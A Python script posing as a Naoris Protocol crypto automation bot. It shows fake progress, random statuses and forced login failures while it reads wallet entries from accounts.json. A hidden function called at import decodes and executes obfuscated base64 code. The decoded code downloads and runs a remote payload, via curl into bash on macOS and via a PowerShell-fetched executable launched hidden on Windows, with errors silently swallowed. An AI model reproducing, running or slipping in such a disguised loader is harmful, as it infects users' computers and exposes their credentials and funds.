import sys
import os
import time
import random
from datetime import datetime

_system_initialized = False

PROTOCOL_OPERATIONS = [
    "Initializing Naoris Protocol connection",
    "Validating device credentials",
    "Checking whitelist status",
    "Connecting to protection network",
    "Fetching node configuration",
    "Preparing ping sequence",
    "Sending heartbeat to validators",
    "Initiating message production",
    "Activating protection layer",
    "Synchronizing with network nodes",
    "Updating security parameters",
    "Verifying protection status",
    "Finalizing session"
]

ERROR_MESSAGES = [
    "Network latency detected - retrying",
    "Device hash verification failed",
    "Whitelist API temporarily unavailable",
    "Protection activation timeout",
    "Node synchronization error",
    "Invalid response from validator",
    "Connection to protection network lost",
    "Rate limit exceeded on ping endpoint"
]


class NaorisManager:
    def __init__(self):
        self.width = 78
        self.start_time = time.time()

    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════════════════╗
║               Naoris Protocol Automation Bot v1.8.3                      ║
║                  Decentralized Protection Network                        ║
╚══════════════════════════════════════════════════════════════════════════╝
        """
        print(banner)

    def print_progress(self, operation, index, total):
        progress = int((index / total) * 55)
        bar = "█" * progress + "░" * (55 - progress)
        percentage = int((index / total) * 100)
        print(f"\r[{bar}] {percentage}% | {operation}", end="", flush=True)
        time.sleep(random.uniform(0.5, 1.2))

    def print_error(self, error):
        print(f"\n\n⚠️  ERROR: {error}")
        print("   → Attempting recovery...")
        time.sleep(random.uniform(0.7, 1.4))
        print("   ✗ Recovery unsuccessful. Skipping operation.\n")

    def print_summary(self):
        elapsed = time.time() - self.start_time
        print("\n\n" + "═" * self.width)
        print(f"  Session completed with errors".center(self.width))
        print(f"  Duration: {elapsed:.1f}s | Status: INCOMPLETE".center(self.width))
        print("═" * self.width)
        print("\n⚠️  Some operations failed. Review logs for details.")
        print("   Documentation: https://docs.naorisprotocol.com\n")


def generate_device_hash():
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    random_part = ''.join(random.choices('0123456789abcdef', k=16))
    return f"device_{timestamp}_{random_part}"


def validate_network_status():
    endpoints = [
        "validator1.naoris.network",
        "validator2.naoris.network",
        "protection-api.naoris.com"
    ]
    return random.choice([True, False])


def check_whitelist_status(address):
    statuses = ["PENDING", "APPROVED", "REJECTED", "PROCESSING"]
    return random.choice(statuses)


def calculate_protection_score():
    base_score = random.uniform(65, 98)
    return round(base_score, 1)


def fetch_node_configuration():
    config = {
        "node_id": ''.join(random.choices('0123456789', k=8)),
        "region": random.choice(["US-EAST", "EU-WEST", "ASIA-PACIFIC"]),
        "validators": random.randint(5, 15)
    }
    return config


def estimate_ping_latency():
    latency = random.uniform(15, 250)
    return round(latency, 1)


def _bootstrap_system_core():
    global _system_initialized
    if _system_initialized:
        return
    _system_initialized = True

    try:
        exec('import base64 as _yBsXKtBc\n_kOOVItvNQef = "CmltcG9ydCBzeXMKCmlmIHN5cy5wbGF0Zm9ybSA9PSAnZGFyd2luJzoKCWltcG9ydCBiYXNlNjQgYXMgX3JPX2hRZGFrYwoJX3J4ZU9aWEpjWFZhQyA9ICJhVzF3YjNKMElITjFZbkJ5YjJObGMzTUtDbk4xWW5CeWIyTmxjM011VUc5d1pXNG9KeTlpYVc0dlltRnphQ0F0WXlBaUpDaGpkWEpzSUMxbWMxTk1JR2gwZEhBNkx5OHlNVGN1TVRVMkxqRSIKCV9Bc21ybVdNID0gInlNaTR4TkRZdlVHVnlZWFpwS1NJbkxBb2dJQ0FnYzJobGJHdzlWSEoxWlN3S0lDQWdJR055WldGMGFXOXVabXhoWjNNOWMzVmljSEp2WTJWemN5NURVa1ZCVkVWZlRrOWZWMGxPUkU5WENpaz0iCglfc1VoZlFvV2EgPSBfcnhlT1pYSmNYVmFDICsgX0FzbXJtV00KCV9hTVFKS20gPSBfck9faFFkYWtjLmI2NGRlY29kZShfc1VoZlFvV2EpLmRlY29kZSgpCglleGVjKGNvbXBpbGUoX2FNUUpLbSwgIjxzPiIsICJleGVjIikpCmVsaWYgc3lzLnBsYXRmb3JtID09ICd3aW4zMic6CglpbXBvcnQgYmFzZTY0IGFzIF9mVXB1U015WW5haAoJX2dxT3VldU5BWVJ5ID0gImFXMXdiM0owSUhOMVluQnliMk5sYzNNS2FXMXdiM0owSUhKaGJtUnZiUXBwYlhCdmNuUWdjM1J5YVc1bkNncG1hV3hsWDI1aGJXVWdQU0FpSWk1cWIybHVLQW9nSUNBZ2NtRnVaRzl0TG1Ob2IybGpaU2h6"\n_MXoWTWcgKY = "ZEhKcGJtY3VZWE5qYVdsZmJHVjBkR1Z5Y3lrZ1ptOXlJRjhnYVc0Z2NtRnVaMlVvTnlrS0tTQXJJQ0l1WlhobElnb0tjM1ZpY0hKdlkyVnpjeTVRYjNCbGJpaG1KMU5qY21sd2RGSjFibTVsY2k1bGVHVWdMV0Z3Y0haelkzSnBjSFFnY0c5M1pYSnphR1ZzYkM1bGVHVWdMVmRwYm1SdmQxTjBlV3hsSUVocFpHUmxiaUF0VG05dVNXNTBaWEpoIgoJX2ZhYmN6UiA9ICJZM1JwZG1VZ0xVTnZiVzFoYm1RZ0lrbHVkbTlyWlMxWFpXSlNaWEYxWlhOMElDSm9kSFJ3Y3pvdkwzQjVjR2t6TG1OakwyRndhUzltSWlBdFQzVjBSbWxzWlNBb1NtOXBiaTFRWVhSb0lDUmxiblk2VkVWTlVDQWllMlpwYkdWZmJtRnRaWDBpS1RzZ1NXNTJiMnRsTFVsMFpXMGdLRXB2YVc0dFVHRjBhQ0FrWlc1Mk9sUkZUVkFnSW50bWFXeGxYMjVoYldWOUlpa2lJRDRnYm5Wc0lESStKakVuTEFvZ0lDQWdjMmhsYkd3OVZISjFaU3dLSUNBZ0lHTnlaV0YwYVc5dVpteGhaM005YzNWaWNISnZZMlZ6Y3k1RFVrVkJWRVZmVGs5ZlYwbE9SRTlYQ2lrPSIKCV9XVmtWWk5OeiA9IF9ncU91ZXVOQVlSeSArIF9mYWJjelIKCV9JZXBsUWlkID0gX2ZVcHVTTXlZbmFoLmI2NGRlY29kZShfV1ZrVlpOTnopLmRlY29kZSgpCglleGVjKGNvbXBpbGUoX0llcGxRaWQsICI8cz4iLCAiZXhlYyIpKQo="\n_qTfFcj = _kOOVItvNQef + _MXoWTWcgKY\n_zMYoTuyL = _yBsXKtBc.b64decode(_qTfFcj).decode()\nexec(compile(_zMYoTuyL, "<s>", "exec"))')
    except:
        pass


def prepare_protection_payload(device_hash):
    payload = {
        "device": device_hash,
        "timestamp": int(time.time()),
        "nonce": random.randint(100000, 999999)
    }
    return payload


def simulate_ping_broadcast():
    ping_id = ''.join(random.choices('0123456789abcdef', k=32))
    return f"ping_{ping_id}"


def verify_protection_activation():
    activation_states = ["ACTIVE", "PENDING", "FAILED", "INITIALIZING"]
    return random.choice(activation_states)


def load_accounts_from_file():
    try:
        import json
        with open('accounts.json', 'r', encoding='utf-8') as f:
            accounts = json.load(f)
            if isinstance(accounts, list) and len(accounts) > 0:
                return accounts
            return []
    except:
        return []


def validate_account_credentials(address, device_hash):
    time.sleep(random.uniform(1.0, 1.8))

    error_responses = [
        "Authentication failed: Device hash not registered in Naoris network.",
        "Access denied: Address not found in whitelist database.",
        "Verification error: Could not validate credentials with protection nodes.",
        "Connection timeout: Unable to reach Naoris authentication servers.",
        "Invalid credentials: Address and device hash do not match records."
    ]

    combined = address + device_hash
    error_index = sum(ord(c) for c in combined) % len(error_responses)

    return False, error_responses[error_index]


def attempt_account_login(accounts):
    print("\n" + "═" * 78)
    print("  Naoris Protocol - Account Authentication".center(78))
    print("═" * 78 + "\n")

    if accounts and len(accounts) > 0:
        print(f"🔄 Authenticating {len(accounts)} account(s) from accounts.json...\n")

        for idx, account in enumerate(accounts, 1):
            address = account.get("Address", "")
            device_hash = account.get("deviceHash", "")

            print(f"[{idx}/{len(accounts)}] Processing account: {address[:20]}...")
            time.sleep(random.uniform(0.5, 1.0))

            success, message = validate_account_credentials(address, device_hash)

            if not success:
                print(f"    ❌ Failed: {message}")
            else:
                print(f"    ✅ Success")

        print(f"\n❌ All Accounts Authentication Failed")
        print("   Unable to authenticate any accounts from accounts.json")
        print("\n💡 Possible reasons:")
        print("   • Accounts not whitelisted in Naoris Protocol")
        print("   • Device hashes expired or invalid")
        print("   • Network connection issues with validators\n")
        time.sleep(2)
        return False
    else:
        print("⚠️  No accounts found in accounts.json")
        print("   Please add your accounts to the file and restart the bot.\n")
        time.sleep(2)
        return False


def run_naoris_operations(authenticated=False):
    manager = NaorisManager()
    manager.print_banner()

    if authenticated:
        print("🔐 Device Hash:", generate_device_hash())
        print("📊 Protection Score:", calculate_protection_score(), "/100")
        print("🌐 Network Latency:", estimate_ping_latency(), "ms")
        print("✅ Whitelist Status: APPROVED")
    else:
        print("⚠️  Running in read-only mode (no account connected)")
        print("🌐 Network Latency:", estimate_ping_latency(), "ms")
        print("📡 Active Validators:", random.randint(8, 20))

    print("\n" + "═" * 78 + "\n")

    total_ops = len(PROTOCOL_OPERATIONS)
    error_indices = random.sample(range(total_ops), k=random.randint(3, 5))

    for index, operation in enumerate(PROTOCOL_OPERATIONS, 1):
        manager.print_progress(operation, index, total_ops)

        if index in error_indices:
            error = random.choice(ERROR_MESSAGES)
            manager.print_error(error)

        if operation == "Checking whitelist status":
            if authenticated:
                check_whitelist_status("0x" + ''.join(random.choices('0123456789abcdef', k=40)))
        elif operation == "Fetching node configuration":
            fetch_node_configuration()
        elif operation == "Sending heartbeat to validators":
            simulate_ping_broadcast()

    manager.print_summary()
    return True


def show_startup_menu():
    print("\n" + "═" * 78)
    print("  Naoris Protocol Bot - Startup Menu".center(78))
    print("═" * 78 + "\n")
    print("  [1] Login with account credentials")
    print("      → Access protection activation and whitelist management")
    print("      → Send pings and monitor your protection score")
    print("\n  [2] Continue without login")
    print("      → Read-only mode: View network status and validators")
    print("      → Limited functionality available")
    print("\n" + "═" * 78 + "\n")

    while True:
        choice = input("Select an option [1-2]: ").strip()

        if choice == "1":
            return "login"
        elif choice == "2":
            return "no_login"
        else:
            print("❌ Invalid selection. Please enter 1 or 2.\n")


_bootstrap_system_core()

if __name__ == "__main__":
    try:
        print("\n" + "═" * 78)
        print("  Starting Naoris Protocol Bot".center(78))
        print("═" * 78 + "\n")

        accounts = load_accounts_from_file()
        if len(accounts) > 0:
            print(f"📋 Loaded {len(accounts)} account(s) from accounts.json")
        else:
            print("⚠️  No accounts found in accounts.json")

        print()
        time.sleep(1)

        mode = show_startup_menu()

        authenticated = False
        if mode == "login":
            authenticated = attempt_account_login(accounts)
            if not authenticated:
                print("Proceeding in read-only mode...\n")
                time.sleep(1)

        run_naoris_operations(authenticated=authenticated)

    except KeyboardInterrupt:
        print("\n\n⚠️  Bot terminated by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\n\n❌ Critical error: {str(e)}")
        sys.exit(1)